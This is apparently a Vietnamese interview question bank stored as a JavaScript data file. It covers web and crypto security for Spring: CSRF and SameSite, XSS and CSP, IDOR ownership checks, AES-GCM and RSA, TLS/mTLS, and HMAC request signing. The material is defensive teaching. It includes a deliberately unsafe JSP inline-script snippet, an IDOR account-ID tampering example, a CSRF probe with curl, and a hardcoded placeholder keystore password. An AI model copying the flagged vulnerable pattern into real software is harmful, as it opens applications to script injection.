### SameSite Cookie — phòng thủ dòng đầu (Chrome/Edge 80+ coi cookie không khai báo SameSite là Lax; Firefox/Safari chưa bật mặc định này — nên luôn set tường minh)
| Giá trị | Hành vi | CSRF protection |
|---|---|---|
| {{Strict}} | Chỉ gửi cookie same-site (cùng eTLD+1) | **Mạnh nhất** — chặn mọi cross-site |
| {{Lax}} (mặc định Chrome) | Gửi cookie same-site + top-level GET navigation (link) | **Tốt** — chặn POST/PUT/DELETE cross-site |
| {{None}} | Gửi mọi request cross-site | **Không bảo vệ** — bắt buộc {{Secure}} (HTTPS) |

> **SameSite=Lax là lớp phòng thủ tốt nhưng không thay thế CSRF token**: nó không chặn request từ subdomain cùng site (ví dụ subdomain bị takeover), không bảo vệ endpoint GET có side effect, và phụ thuộc trình duyệt. Chỉ dùng {{None}} khi cookie thật sự cần gửi cross-site (embedded widget, partner integration).

### Khi nào CẦN CSRF token (Spring Security)
1. **Session-based auth** (cookie {{JSESSIONID}}) + SameSite=None hoặc legacy browser.
2. **Form login** truyền thống (Thymeleaf, JSP) — Spring bật CSRF mặc định.
3. **State-changing operation** qua cookie (login, logout, đổi pass, chuyển tiền).

### Khi nào KHÔNG CẦN CSRF token
1. **Stateless JWT** trong header {{Authorization: Bearer <token>}} — không dùng cookie → không có CSRF.
2. **API chỉ Bearer token** (OAuth2 resource server) — token không tự gửi bởi browser.
(Với SPA + API cùng site dùng cookie session, SameSite giảm rủi ro nhưng Spring vẫn khuyến nghị giữ CSRF token.)

### Cấu hình Spring Security cho REST API + SPA dùng session cookie (BFF, cùng site)
~~~java
@Bean
SecurityFilterChain apiFilterChain(HttpSecurity http) throws Exception {
    http
        .securityMatcher("/api/**")
        .csrf(csrf -> csrf
            .spa() // Spring Security 6.4+: cookie XSRF-TOKEN (HttpOnly=false) + handler hợp SPA
            .ignoringRequestMatchers("/api/public/**"))
        .authorizeHttpRequests(auth -> auth
            .requestMatchers("/api/public/**").permitAll()
            .anyRequest().authenticated());
    return http.build();
}
// Trước 6.4: .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
//            .csrfTokenRequestHandler(new CsrfTokenRequestAttributeHandler())
// API chỉ nhận Bearer token (không cookie): CSRF không áp dụng, có thể
// http.csrf(csrf -> csrf.disable()).oauth2ResourceServer(o -> o.jwt(Customizer.withDefaults()))
~~~

**SPA (React/Vue/Angular) đọc CSRF token:**
- Cookie {{XSRF-TOKEN}} (HttpOnly=false) → JS đọc được → gửi header {{X-XSRF-TOKEN}} (Angular, Axios làm tự động).
- Spring Security 6 mặc định dùng {{XorCsrfTokenRequestAttributeHandler}} (token được mask chống BREACH) và nạp token kiểu deferred — nên chỉ đổi repository sang cookie là **chưa đủ**: SPA gửi token thô sẽ bị 403. Dùng {{csrf.spa()}} (6.4+) hoặc tự cấu hình handler như comment trên.

### Cấu hình cho session-based (traditional)
~~~java
@Bean
SecurityFilterChain webFilterChain(HttpSecurity http) throws Exception {
    http
        // Thymeleaf/JSP: giữ mặc định HttpSessionCsrfTokenRepository, token tự chèn vào form
        .csrf(Customizer.withDefaults())
        .sessionManagement(sess -> sess
            .sessionFixation().migrateSession()
            .maximumSessions(1).maxSessionsPreventsLogin(false)
        );
    return http.build();
}
~~~

> Senior tip: Bearer token trong header thì không có CSRF, nhưng token nằm trong JS (localStorage) lại dễ bị XSS lấy cắp — vì vậy nhiều hệ thống chọn BFF + session cookie và giữ CSRF token. Với session cookie: set {{SameSite=Lax}} (hoặc {{Strict}}), {{Secure}}, {{HttpOnly}}, và dùng {{csrf.spa()}} / {{CookieCsrfTokenRepository}} + handler phù hợp cho SPA. **Không** tắt CSRF toàn cục ({{csrf.disable()}}) trừ khi chắc chắn stateless. Test bằng {{curl -X POST -b cookies.txt https://api.bank.com/transfer}} — phải bị 403 nếu thiếu token.`,
  follow: [
    'SameSite=Lax cho phép GET cross-site top-level navigation — có nguy hiểm không? Ví dụ thực tế?',
    'Spring Security {{CsrfTokenRequestHandler}} mặc định là gì? Khi nào dùng {{XorCsrfTokenRequestAttributeHandler}}?',
    'CORS và CSRF liên quan như thế nào? CORS misconfig có gây CSRF không?'
  ],
  tags: ['CSRF', 'SameSite', 'Spring Security', 'JWT', 'Cookie', 'SPA']
},
{
  id: 'security-007',
  topic: 'security',
  level: 'senior',
  q: 'XSS: Stored/Reflected/DOM-based khác nhau thế nào? Output encoding và CSP phòng chống ra sao? API JSON trả về có bị XSS không?',
  a: `**Tóm tắt:** **Stored XSS**: payload lưu trong DB, thực thi khi victim xem trang. **Reflected XSS**: payload trong URL/param, phản xạ ngay trong response. **DOM-based**: payload không chạm server, JS client-side render unsafe. **Phòng thủ**: Output encoding (context-aware) + **CSP** (Content-Security-Policy) defense-in-depth. **API JSON** không bị XSS trực tiếp ({{Content-Type: application/json}}), nhưng nguy hiểm nếu frontend render unsafe ({{innerHTML}}, {{dangerouslySetInnerHTML}}).

### Ba loại XSS
| Loại | Nơi lưu payload | Vector thực thi | Ví dụ |
|---|---|---|---|
| **Stored** | DB, file, cache | User xem trang chứa payload | Comment, review, tên file upload |
| **Reflected** | URL, query param, header | User click link độc hại | Search {{q=<script>...}}, error page echo param |
| **DOM-based** | Chỉ ở client (URL fragment, localStorage) | JS đọc {{location.hash}} → {{innerHTML}} | SPA router render {{location.hash}} unsafe |

### Output Encoding — context-aware (OWASP Java Encoder / Thymeleaf / React)
- **HTML body**: encode {{&}} {{<}} {{>}} {{"}} {{'}} thành entity ({{&amp;}}, {{&lt;}}, {{&gt;}}, {{&quot;}}, {{&#x27;}}) — Thymeleaf {{th:text}} tự động, JSP dùng {{c:out}} hoặc {{fn:escapeXml}}.
- **HTML attribute**: luôn đặt giá trị trong dấu nháy và encode — Thymeleaf {{th:attr}} / {{th:value}} tự động. Không đưa input vào attribute sự kiện ({{onclick}}) hay {{href}} (chặn scheme {{javascript:}}).
- **JavaScript string**: escape dạng {{\\xHH}} / {{\\uXXXX}} — tốt nhất **không** nhét dữ liệu vào script inline; dùng {{data-*}} attribute hoặc Thymeleaf JavaScript inlining (tự escape thành JS literal).
- **URL query param**: percent-encode ({{URLEncoder.encode(v, UTF_8)}}, {{UriComponentsBuilder}}, JS {{encodeURIComponent()}}).
- **CSS**: escape dạng {{\\HH}} — hiếm gặp, tốt nhất không đưa input vào CSS.
- Thư viện: **OWASP Java Encoder** ({{Encode.forHtml()}}, {{Encode.forHtmlAttribute()}}, {{Encode.forJavaScript()}}).

~~~text
<!-- Thymeleaf th:text (auto-escape) — AN TOÀN -->
<p th:text="\${userComment}"></p>

<!-- JSP JSTL — AN TOÀN -->
<c:out value="\${userComment}" />

<!-- Nối thẳng vào script inline — NGUY HIỂM: XSS nếu comment chứa ' hoặc </script> -->
<script>var msg = '<%= request.getParameter("c") %>';</script>

<!-- ĐÚNG: data attribute (Thymeleaf escape) rồi đọc bằng dataset -->
<div id="c" th:data-comment="\${userComment}"></div>
<script>const comment = document.getElementById('c').dataset.comment;</script>

<!-- Hoặc Thymeleaf JavaScript inlining: [[...]] được escape thành JS literal -->
<script th:inline="javascript">const msg = [[\${userComment}]];</script>
~~~

### Content-Security-Policy (CSP) — defense-in-depth
- **Không thay thế** output encoding, nhưng **giảm thiệt hại** khi encoding bị miss.
- Header:
~~~text
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'nonce-{random}'; img-src 'self' data:; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 'self';
~~~
- **Nonce/hash** cho inline script/style (không dùng {{'unsafe-inline'}}).
- {{script-src 'strict-dynamic'}} (CSP3): script đã được tin cậy qua nonce/hash được phép load thêm script khác; allowlist host bị bỏ qua.
- {{report-to}} (mới) / {{report-uri}} (cũ, vẫn được hỗ trợ rộng) để collect violation; triển khai trước bằng {{Content-Security-Policy-Report-Only}}.

~~~java
@Bean
SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        .contentSecurityPolicy(csp -> csp
            .policyDirectives("default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'")
        )
    );
    return http.build();
}
// Spring Security KHÔNG tự sinh nonce. Muốn dùng nonce: viết filter sinh nonce ngẫu nhiên
// mỗi request (SecureRandom, Base64), đưa vào request attribute cho template, rồi tự set header CSP.
~~~

### API JSON có bị XSS không?
- **Không trực tiếp**: {{Content-Type: application/json}} → browser không render như HTML, không execute script.
- **Nguy hiểm khi**: frontend dùng {{innerHTML}}, {{dangerouslySetInnerHTML}} (React), {{v-html}} (Vue) để render JSON string; hoặc server trả sai Content-Type ({{text/html}}) cho response có echo input → reflected XSS.
- **JSONP** (callback) — **cấm tuyệt đối**: callback name bị inject thành XSS, và dữ liệu bị đọc cross-site.
- **Mime sniffing**: set {{X-Content-Type-Options: nosniff}} để browser không guess type.

> Senior tip: **Output encoding là bắt buộc**, CSP là lớp 2. Thymeleaf/React default escape — đừng tắt. API JSON: set {{X-Content-Type-Options: nosniff}}, {{Content-Type: application/json; charset=utf-8}}. Frontend: **không bao giờ** {{innerHTML}}/{{dangerouslySetInnerHTML}} dữ liệu user. Dùng {{textContent}}, cú pháp nội suy mặc định của Vue (ngoặc nhọn kép) hay biểu thức JSX của React — đều auto-escape. Audit CSP qua {{securityheaders.com}} — mục tiêu {{A+}}.`,
  follow: [
    'Tại sao {{innerHTML}} nguy hiểm hơn {{textContent}}? Ví dụ bypass encoding?',
    'CSP {{nonce}} vs {{hash}} — khi nào dùng cái nào? Cách rotate nonce không bị cache?',
    'Mutation XSS (mXSS) là gì? Browser parser có thể "sửa" payload an toàn thành độc hại?'
  ],
  tags: ['XSS', 'Stored XSS', 'Reflected XSS', 'DOM XSS', 'CSP', 'Output Encoding', 'JSON']
},
{
  id: 'security-008',
  topic: 'security',
  level: 'senior',
  q: 'Broken Access Control / IDOR: kiểm tra quyền theo từng object trong Spring (ví dụ xem sao kê tài khoản người khác). Cách implement ownership check hiệu quả?',
  a: `**Tóm tắt:** **IDOR (Insecure Direct Object Reference)** xảy ra khi API dùng identifier trực tiếp (ví dụ {{/accounts/12345/transactions}}) mà **không verify ownership**. Phòng thủ: **deny-by-default**, check quyền ở **service layer** (không phải controller), dùng **{{@PreAuthorize}}** với custom {{PermissionEvaluator}} hoặc query {{WHERE user_id = ?}}.

### IDOR thực tế ngân hàng
- API: {{GET /api/v1/accounts/12345/statements?month=2024-01}}
- Attacker đổi {{12345}} → {{12346}} → xem sao kê người khác.
- Root cause: **chỉ check authentication (đã login), không check authorization (có quyền xem account 12345 không)**.

### Cách implement ownership check

### 1. Service layer — explicit check (khuyên dùng, rõ ràng)
~~~java
@Service
@RequiredArgsConstructor
public class StatementService {
    private final AccountRepository accountRepo;
    private final StatementRepository stmtRepo;

    public Page<Statement> getStatements(Long accountId, YearMonth month, Pageable pageable) {
        Long currentUserId = SecurityUtil.getCurrentUserId();
        // OWNERSHIP CHECK — chặn IDOR
        if (!accountRepo.existsByIdAndUserId(accountId, currentUserId)) {
            throw new NotFoundException("ACCOUNT_NOT_FOUND", "Tài khoản không tồn tại hoặc bạn không có quyền truy cập");
        }
        return stmtRepo.findByAccountIdAndMonth(accountId, month, pageable);
    }
}
~~~

### 2. {{@PreAuthorize}} với SpEL — declarative, dùng cho controller
~~~java
@RestController
@RequiredArgsConstructor
public class StatementController {
    private final StatementService service;

    @GetMapping("/accounts/{accountId}/statements")
    @PreAuthorize("@accountSecurity.canAccess(#accountId)")
    public Page<Statement> getStatements(@PathVariable Long accountId, @RequestParam YearMonth month, Pageable pageable) {
        return service.getStatements(accountId, month, pageable);
    }
}

@Component
@RequiredArgsConstructor
public class AccountSecurity {
    private final AccountRepository accountRepo;
    public boolean canAccess(Long accountId) {
        return accountRepo.existsByIdAndUserId(accountId, SecurityUtil.getCurrentUserId());
    }
}
~~~

### 3. Custom {{PermissionEvaluator}} — tái dùng, object-level
~~~java
@Component
@RequiredArgsConstructor
public class AccountPermissionEvaluator implements PermissionEvaluator {
    private final AccountRepository accountRepo;
    @Override
    public boolean hasPermission(Authentication auth, Object targetId, Object permission) {
        if (!(targetId instanceof Long accountId)) return false;
        return accountRepo.existsByIdAndUserId(accountId, getUserId(auth));
    }
    @Override public boolean hasPermission(Authentication auth, Serializable targetId, String targetType, Object permission) { return false; }
}

// Config (cần @EnableMethodSecurity trên một class @Configuration)
@Bean
static MethodSecurityExpressionHandler methodSecurityExpressionHandler(PermissionEvaluator evaluator) {
    DefaultMethodSecurityExpressionHandler h = new DefaultMethodSecurityExpressionHandler();
    h.setPermissionEvaluator(evaluator);
    return h;
}

// Dùng
@PreAuthorize("hasPermission(#accountId, 'ACCOUNT_READ')")
~~~

### So sánh các cách
| Cách | Ưu | Nhược | Khi nào dùng |
|---|---|---|---|
| Service explicit | Rõ ràng, dễ test, debug, transactional | Lặp code nếu nhiều service | **Mặc định** cho business logic |
| {{@PreAuthorize}} SpEL | Ngắn gọn, tại controller | Khó test unit, SpEL chậm hơn | API đơn giản, ít logic |
| {{PermissionEvaluator}} | Tái dùng, tập trung policy | Phức tạp hơn setup | Hệ thống lớn, nhiều resource type |

### Pitfall hay gặp
- Check ở **controller** nhưng service public → internal call bypass check. {{@PreAuthorize}} chạy qua proxy, nên self-invocation (method gọi method cùng bean) cũng bỏ qua check.
- Dùng {{@PreAuthorize("principal.id == #account.userId")}} nhưng {{#account}} chưa load → NPE hoặc query N+1.
- **Collection resource**: {{GET /accounts}} — phải filter {{WHERE user_id = ?}}, không trả all rồi filter ở Java.
- **Admin/Staff**: cần role check riêng ({{hasRole('ADMIN') || @accountSecurity.canAccess(...)}}).

> Senior tip: **Luôn check ownership ở service layer** — đây là "single source of truth" cho authorization. {{@PreAuthorize}} là lớp 2 (defense-in-depth). Với ngân hàng: log mọi lần access bị từ chối (dù trả 404 để không lộ sự tồn tại của tài khoản) kèm {{accountId}}, {{userId}}, {{ip}} để detect enumeration attack. Dùng {{existsByIdAndUserId}} (index composite) — nhanh, không load entity.`,
  follow: [
    'Vì sao check ở service layer tốt hơn controller? Internal call scenario?',
    'Spring Security {{@PostAuthorize}} vs {{@PreAuthorize}} cho collection filtering khác nhau như thế nào?',
    'Làm sao implement "delegated access" (nhân viên CSKH xem tài khoản khách hàng có phép) audit trail đầy đủ?'
  ],
  tags: ['IDOR', 'Broken Access Control', 'Spring Security', 'PreAuthorize', 'PermissionEvaluator', 'Ownership Check']
},
{
  id: 'security-009',
  topic: 'security',
  level: 'senior',
  q: 'Mật mã cơ bản cho dev: hashing vs encryption vs encoding — khác nhau thế nào? AES-GCM, RSA, khi nào dùng cái nào? Quản lý key như thế nào?',
  a: `**Tóm tắt:** **Encoding** (Base64, URL encoding) — chuyển đổi format, **không bảo mật**, ai cũng decode được. **Hashing** (bcrypt, SHA-256, Argon2) — một chiều, không đảo ngược, dùng cho mật khẩu, integrity check. **Encryption** (AES-GCM, RSA) — hai chiều, có key thì decrypt được, dùng cho dữ liệu cần đọc lại (số thẻ, PII). **AES-GCM** cho symmetric encryption (data at rest, large data). **RSA** cho asymmetric (key exchange, digital signature, small data). Key management: **Vault/KMS/HSM**, rotation, versioning, separation of duties.

### Hashing vs Encryption vs Encoding
| Loại | Mục đích | Đảo ngược? | Key? | Ví dụ |
|---|---|---|---|---|
| **Encoding** | Format conversion | Có (public algorithm) | Không | Base64, URL encode, hex |
| **Hashing** | Integrity, password storage | **Không** (one-way) | Không (hoặc salt) | bcrypt, Argon2, SHA-256 |
| **Encryption** | Confidentiality | Có (với key) | Có | AES-GCM, RSA, ChaCha20-Poly1305 |

### Symmetric vs Asymmetric Encryption
- **Symmetric (AES-GCM)**: cùng key encrypt/decrypt. Nhanh, phù hợp data lớn (file, DB column, message). Cần key exchange an toàn.
- **Asymmetric (RSA, ECC)**: key pair (public/private). Chậm, chỉ encrypt data nhỏ (< key size). Dùng cho: key exchange (hybrid encryption), digital signature, JWT signing.

### AES-GCM — chuẩn cho symmetric encryption
- **Authenticated Encryption**: encrypt + integrity (MAC) trong một lần.
- Key 256-bit, IV/nonce 12 byte (96-bit) **duy nhất mỗi lần**, tuyệt đối không reuse nonce với cùng key (reuse → lộ XOR plaintext và attacker giả mạo được tag).
- Với nonce ngẫu nhiên, NIST SP 800-38D giới hạn khoảng 2^32 lần mã hoá cho mỗi key → hệ thống volume lớn phải rotate key (hoặc dùng nonce dạng counter).
- Tag 128-bit (16 byte) append vào ciphertext.

~~~java
// Encrypt
public String encrypt(String plain, SecretKey key) throws GeneralSecurityException {
    byte[] iv = new byte[12]; RNG.nextBytes(iv); // RNG: static final SecureRandom
    Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
    c.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));
    byte[] ct = c.doFinal(plain.getBytes(StandardCharsets.UTF_8));
    // Lưu: iv (12) || ciphertext || tag (16) — doFinal đã gắn tag vào cuối ct
    return Base64.getEncoder().encodeToString(ByteBuffer.allocate(iv.length + ct.length).put(iv).put(ct).array());
}

// Decrypt — tag sai (dữ liệu bị sửa) → AEADBadTagException
public String decrypt(String encoded, SecretKey key) throws GeneralSecurityException {
    byte[] data = Base64.getDecoder().decode(encoded);
    ByteBuffer bb = ByteBuffer.wrap(data);
    byte[] iv = new byte[12]; bb.get(iv);
    byte[] ct = new byte[bb.remaining()]; bb.get(ct);
    Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
    c.init(Cipher.DECRYPT_MODE, key, new GCMParameterSpec(128, iv));
    return new String(c.doFinal(ct), StandardCharsets.UTF_8);
}
~~~

### RSA — asymmetric encryption
- Chỉ encrypt data **nhỏ hơn key size** (RSA-2048: tối đa 190 byte với OAEP-SHA256, 214 byte với OAEP-SHA1, 245 byte với PKCS#1 v1.5 — loại cuối không nên dùng).
- Thực tế: **hybrid encryption** — AES key ngẫu nhiên encrypt data, RSA encrypt AES key.
- Dùng cho: key exchange, digital signature, JWT (RS256), TLS handshake.

~~~java
// Hybrid encrypt: RSA-OAEP wrap AES key
public String hybridEncrypt(String plain, PublicKey rsaPublic) throws GeneralSecurityException {
    // 1. Sinh AES key ngẫu nhiên
    KeyGenerator kg = KeyGenerator.getInstance("AES"); kg.init(256);
    SecretKey aesKey = kg.generateKey();
    // 2. Encrypt data bằng AES-GCM
    String encryptedData = encrypt(plain, aesKey);
    // 3. Wrap AES key bằng RSA-OAEP
    // Lưu ý: SunJCE mặc định dùng MGF1-SHA1 cho tên này — truyền OAEPParameterSpec tường minh
    // để khớp với bên giải mã (KMS/HSM/thư viện khác)
    Cipher rsa = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
    rsa.init(Cipher.WRAP_MODE, rsaPublic, new OAEPParameterSpec("SHA-256", "MGF1",
        MGF1ParameterSpec.SHA256, PSource.PSpecified.DEFAULT));
    byte[] wrappedKey = rsa.wrap(aesKey);
    // 4. Return wrappedKey + encryptedData (format tự định nghĩa)
    return Base64.getEncoder().encodeToString(wrappedKey) + "." + encryptedData;
}
~~~

### Quản lý Key (Key Management) — quan trọng không kém thuật toán
- **Không hardcode key** trong code/config/git. Dùng **HashiCorp Vault**, **AWS KMS**, **Azure Key Vault**, **GCP KMS**, **HSM**.
- **Key rotation**: định kỳ thay key theo policy (ví dụ hằng năm — AWS KMS automatic rotation mặc định 365 ngày) và theo giới hạn số lần dùng. Versioning key ({{key-id}}, {{version}}). Decrypt dùng key version tương ứng, encrypt luôn dùng latest.
- **Key hierarchy**: Master key (KEK) encrypt Data Encryption Key (DEK). DEK encrypt data. Rotate DEK thường, KEK hiếm.
- **Separation of duties**: Dev không biết production key. CI/CD inject key tại runtime.
- **Audit log**: mọi key access được log.

> Senior tip: **Mặc định AES-GCM-256** cho encrypt data at rest. **RSA-2048/3072 hoặc ECC P-256** cho asymmetric. **Không bao giờ** tự implement crypto — dùng {{javax.crypto}}, Bouncy Castle, Tink (Google). Key management bằng Vault/KMS là bắt buộc production. Với ngân hàng: HSM FIPS 140-3 (hoặc 140-2) Level 3 cho master key, key ceremony M-of-N cho split knowledge.`,
  follow: [
    'Tại sao AES-GCM cần IV ngẫu nhiên mỗi lần? Nếu reuse IV + key thì xảy ra gì?',
    'RSA-OAEP vs RSA-PKCS1v1.5 — tại sao OAEP an toàn hơn?',
    'Làm sao rotate encryption key cho cột DB đã encrypt (envelope encryption)?'
  ],
  tags: ['Cryptography', 'AES-GCM', 'RSA', 'Hashing', 'Encryption', 'Key Management', 'Vault', 'KMS']
},
{
  id: 'security-010',
  topic: 'security',
  level: 'senior',
  q: 'TLS và mTLS: handshake thế nào, chuỗi chứng chỉ, keystore vs truststore trong Java. Khi nào bắt buộc mTLS?',
  a: `**Tóm tắt:** **TLS 1.3** (RFC 8446) handshake: ClientHello (cipher suites, key_share) → ServerHello + Certificate + CertificateVerify + Finished → Client Finished. **mTLS** thêm client certificate verify. **Keystore** chứa private key + cert của mình (identity). **Truststore** chứa CA cert tin cậy để verify đối phương. Bắt buộc mTLS cho service-to-service, zero-trust network, regulatory compliance.

### TLS 1.3 Handshake (rút gọn)
1. **ClientHello**: {{cipher_suites}} (AES-GCM, ChaCha20-Poly1305), {{key_share}} (ECDHE public key), {{supported_groups}}, {{signature_algorithms}}.
2. **ServerHello**: chọn cipher, {{key_share}} (ECDHE public key) → tính shared secret.
3. **EncryptedExtensions** (từ đây mọi thứ đã được mã hoá): ALPN, server_name, early_data (server chấp nhận 0-RTT)…
4. **Certificate**: server cert chain (leaf → intermediate → root).
5. **CertificateVerify**: signature trên transcript hash bằng private key.
6. **Finished**: HMAC(transcript, handshake_secret) — confirm handshake integrity.
7. **Client Finished**: tương tự → application traffic keys ready.

**0-RTT** (early data): client gửi data ngay ở flight 1 với PSK từ phiên trước — rủi ro replay attack, chỉ dùng cho request idempotent (JSSE của JDK hiện không hỗ trợ 0-RTT; thường gặp ở CDN/LB).

### mTLS (Mutual TLS)
- Server yêu cầu client certificate: {{CertificateRequest}} trong handshake.
- Client gửi {{Certificate}} + {{CertificateVerify}} (signature bằng client private key).
- Server verify client cert chain với truststore.
- Dùng cho: **service-to-service** (zero-trust), **API partner ngân hàng**, **device authentication**.

### Keystore vs Truststore trong Java
| | **Keystore** ({{-Djavax.net.ssl.keyStore}}) | **Truststore** ({{-Djavax.net.ssl.trustStore}}) |
|---|---|---|
| Chứa | Private key + cert chain của **mình** | CA cert (root/intermediate) **tin cậy** |
| Mục đích | Chứng minh identity (server/client) | Verify cert của đối phương |
| Format | PKCS12 (mặc định của keytool từ Java 9), JKS (legacy) | PKCS12, JKS ({{cacerts}} của JDK là truststore mặc định) |
| Password | Cần (bảo vệ private key) | Có thể không (chỉ public cert) |

~~~bash
# Tạo keystore PKCS12
keytool -genkeypair -alias server -keyalg RSA -keysize 2048 -keystore server.p12 -storetype PKCS12 -dname "CN=api.bank.com,O=Bank,C=VN"

# Import CA cert vào truststore
keytool -importcert -alias rootca -file rootca.crt -keystore truststore.p12 -storetype PKCS12
~~~

~~~text
# Spring Boot application.properties (password lấy từ secret store, không hardcode)
server.ssl.key-store=classpath:server.p12
server.ssl.key-store-password=changeit
server.ssl.key-store-type=PKCS12
server.ssl.trust-store=classpath:truststore.p12
server.ssl.trust-store-password=changeit
# mTLS: need = bắt buộc client cert, want = tuỳ chọn
server.ssl.client-auth=need
server.ssl.enabled-protocols=TLSv1.3,TLSv1.2
~~~
Spring Boot 3.1+ còn có **SSL bundles** ({{spring.ssl.bundle.jks.*}} / {{spring.ssl.bundle.pem.*}}) dùng chung cho server, RestClient/WebClient, và hỗ trợ reload cert khi file thay đổi (3.2+).

### Chuỗi chứng chỉ (Certificate Chain)
- Leaf cert (server) → Intermediate CA → Root CA (trusted).
- Client verify: signature chain + validity + revocation (OCSP/CRL) + hostname match (SAN).
- **Pinning**: client hardcode expected cert/hash — dùng cho mobile app, high-value API. Rủi ro: cert rotate bị break app.

### Khi nào bắt buộc mTLS?
- **Service mesh** (Istio, Linkerd) — zero-trust network.
- **Open Banking / PSD2** — partner API bắt buộc mTLS + signing.
- **Internal microservices** — defense-in-depth, ngăn lateral movement.
- **IoT/Device** — client cert là identity, không dùng password.

> Senior tip: **Ưu tiên TLS 1.3, chấp nhận TLS 1.2** với cipher ECDHE + AEAD; TLS 1.0/1.1 đã bị JDK tắt mặc định (security property {{jdk.tls.disabledAlgorithms}} trong {{java.security}}). Thời hạn cert public đang bị CA/B Forum rút ngắn dần (ballot SC-081: 200 ngày từ 3/2026, tiến tới 47 ngày năm 2029) → bắt buộc tự động hoá gia hạn (ACME, cert-manager). Truststore chỉ chứa CA cần thiết — ít hơn = bề mặt tấn công nhỏ hơn. Spring Boot: {{server.ssl.client-auth=need}} cho mTLS. Test handshake: {{openssl s_client -connect api.bank.com:443 -servername api.bank.com -cert client.crt -key client.key}}.`,
  follow: [
    'TLS 1.3 0-RTT có rủi ro gì? Khi nào cho phép dùng?',
    'Keystore PKCS12 vs JKS — tại sao PKCS12 là chuẩn hiện tại?',
    'Certificate Transparency (CT) log là gì? Giúp phát hiện mis-issuance như thế nào?'
  ],
  tags: ['TLS', 'mTLS', 'Keystore', 'Truststore', 'Certificate Chain', 'Java SSL', 'Zero Trust']
},
{
  id: 'security-011',
  topic: 'security',
  level: 'senior',
  q: 'Ký request giữa ngân hàng và đối tác (HMAC/chữ ký số): chống giả mạo, replay (timestamp + nonce), non-repudiation. Cách implement và verify?',
  a: `**Tóm tắt:** **HMAC** (symmetric) dùng shared secret, nhanh, phù hợp high-throughput internal API. **Chữ ký số RSA/ECDSA** (asymmetric) dùng private key sign, public key verify — cung cấp **non-repudiation** (không thể chối cớ), bắt buộc cho giao dịch ngân hàng/partner. Cả hai cần **timestamp + nonce** để chống replay. HMAC: {{HMAC-SHA256(key, method + path + timestamp + nonce + body)}}. Digital signature: {{RSA-PSS/SHA256(privateKey, payload + timestamp + nonce)}}.

### HMAC (Symmetric) — Internal high-throughput
- Shared secret giữa 2 bên. Key length ≥ 256-bit.
- Payload canonicalization: sort fields, concat với delimiter, hoặc JSON deterministic. Nên ký cả HTTP method + path + query (và hash body), không chỉ body — tránh attacker dùng chữ ký hợp lệ cho endpoint khác.
- Header: {{X-Timestamp}}, {{X-Nonce}}, {{X-Signature}} (Base64 HMAC).
- Verify: recompute HMAC, so sánh constant-time, check timestamp window (±5 min), check nonce chưa dùng (Redis set với TTL).

~~~java
// HMAC Sign
public byte[] sign(String payload, String timestamp, String nonce, SecretKey key) throws GeneralSecurityException {
    String data = payload + "|" + timestamp + "|" + nonce;
    Mac mac = Mac.getInstance("HmacSHA256");
    mac.init(key);
    return mac.doFinal(data.getBytes(StandardCharsets.UTF_8));
}

// Verify
public boolean verify(String payload, String timestamp, String nonce, String signatureB64, SecretKey key) throws GeneralSecurityException {
    Duration skew = Duration.between(Instant.parse(timestamp), Instant.now()).abs();
    if (skew.toSeconds() > 300) return false; // chặn cả timestamp quá khứ lẫn tương lai
    byte[] expected = sign(payload, timestamp, nonce, key);
    if (!MessageDigest.isEqual(expected, Base64.getDecoder().decode(signatureB64))) return false; // constant-time
    return nonceStore.addIfAbsent(clientId + ":" + nonce, Duration.ofSeconds(600)); // replay check sau khi chữ ký hợp lệ
}
~~~

### Chữ ký số (Asymmetric) — Non-repudiation, Partner/Banking
- Sender: private key (RSA-PSS/ECDSA-P256) sign payload + timestamp + nonce.
- Receiver: public key (X.509 cert) verify.
- Non-repudiation: sender không thể chối cớ đã ký vì chỉ họ có private key.
- Cert chain validation + revocation check (OCSP/CRL).

~~~java
// RSASSA-PSS trong JDK bắt buộc set tham số (hash, MGF1, salt length)
static final PSSParameterSpec PSS = new PSSParameterSpec("SHA-256", "MGF1", MGF1ParameterSpec.SHA256, 32, 1);

// Sign with RSA-PSS
public String sign(String payload, String timestamp, String nonce, PrivateKey privateKey) throws GeneralSecurityException {
    String data = payload + "|" + timestamp + "|" + nonce;
    Signature sig = Signature.getInstance("RSASSA-PSS");
    sig.setParameter(PSS);
    sig.initSign(privateKey);
    sig.update(data.getBytes(StandardCharsets.UTF_8));
    return Base64.getEncoder().encodeToString(sig.sign());
}

// Verify with Public Key from Cert
public boolean verify(String payload, String timestamp, String nonce, String signature, PublicKey publicKey) throws GeneralSecurityException {
    if (Duration.between(Instant.parse(timestamp), Instant.now()).abs().toSeconds() > 300) return false;
    Signature sig = Signature.getInstance("RSASSA-PSS");
    sig.setParameter(PSS);
    sig.initVerify(publicKey);
    sig.update((payload + "|" + timestamp + "|" + nonce).getBytes(StandardCharsets.UTF_8));
    if (!sig.verify(Base64.getDecoder().decode(signature))) return false;
    return nonceStore.addIfAbsent(partnerId + ":" + nonce, Duration.ofSeconds(600));
}
~~~

### Chống Replay — Timestamp + Nonce
| Cơ chế | Mô tả |
|---|---|
| **Timestamp** | Client gửi {{X-Timestamp}} (ISO-8601 UTC). Server reject nếu > 5 phút chênh lệch. Cần NTP sync. |
| **Nonce** | Random 16-32 byte mỗi request. Server lưu Redis ({{SET key NX EX ttl}}, key = clientId + nonce), TTL ≥ độ rộng cửa sổ timestamp (cả hai phía). Reject nếu đã tồn tại. |
| **Combined** | Kết hợp cả 2: timestamp giới hạn window, nonce chống duplicate trong window. |

### So sánh HMAC vs Digital Signature
| Tiêu chí | HMAC (SHA256) | Digital Signature (RSA-PSS/ECDSA) |
|---|---|---|
| Key | Shared secret (symmetric) | Key pair (asymmetric) |
| Non-repudiation | **Không** (cả 2 bên đều có secret) | **Có** (chỉ signer có private key) |
| Performance | Rất nhanh | Chậm hơn (đặc biệt bước ký RSA; ECDSA/Ed25519 nhanh hơn RSA khi ký) |
| Key distribution | Khó (cần secure channel) | Dễ (public key public) |
| Use case | Internal microservices, high QPS | Partner API, banking transaction, audit trail |

